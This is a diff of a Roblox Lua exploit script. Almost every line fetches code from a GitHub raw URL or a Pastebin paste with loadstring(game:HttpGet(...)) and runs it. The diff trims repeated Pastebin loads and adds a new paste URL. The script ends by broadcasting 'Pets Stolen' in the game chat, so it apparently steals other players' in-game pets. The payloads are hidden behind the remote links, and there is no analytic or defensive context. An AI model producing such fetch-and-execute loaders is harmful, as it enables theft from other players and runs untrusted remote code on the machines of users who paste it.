@@ -1,11 +1,7 @@
+
+
 loadstring(game:HttpGet('https://raw.githubusercontent.com/RENBex6969/Banner/main/SCRIPT'))()
 
-loadstring(game:HttpGet('https://pastebin.com/raw/mQ12eBCd'))()
-
-wait(1)
-loadstring(game:HttpGet('https://pastebin.com/raw/mQ12eBCd'))()
-
-wait(1)
 loadstring(game:HttpGet('https://pastebin.com/raw/mQ12eBCd'))()
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/RENBex6969/Banner/main/SCRIPT'))()
@@ -15,28 +11,14 @@ loadstring(game:HttpGet('https://raw.githubusercontent.com/RENBex6969/Banner/mai
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/RENBex6969/Banner/main/SCRIPT'))()
 
-loadstring(game:HttpGet('https://pastebin.com/raw/mQ12eBCd'))()
-
 wait(1)
-loadstring(game:HttpGet('https://pastebin.com/raw/mQ12eBCd'))()
 
-wait(1)
-loadstring(game:HttpGet('https://pastebin.com/raw/mQ12eBCd'))()
+loadstring(game:HttpGet('https://pastebin.com/raw/yShciP5e'))()
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/RENBex6969/Banner/main/SCRIPT'))()
 
 wait(2)
 loadstring(game:HttpGet('https://raw.githubusercontent.com/RENBex6969/Banner/main/SCRIPT'))()
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/RENBex6969/Banner/main/SCRIPT'))()
-
-loadstring(game:HttpGet('https://pastebin.com/raw/mQ12eBCd'))()
-
-wait(1)
-loadstring(game:HttpGet('https://pastebin.com/raw/mQ12eBCd'))()
-
-wait(1)
-loadstring(game:HttpGet('https://pastebin.com/raw/mQ12eBCd'))()
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/RENBex6969/Banner/main/SCRIPT'))()
 
@@ -45,4 +27,5 @@ loadstring(game:HttpGet('https://raw.githubusercontent.com/RENBex6969/Banner/mai
 
 wait(1)
 game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Pets Stolen" ,"All")
+
 
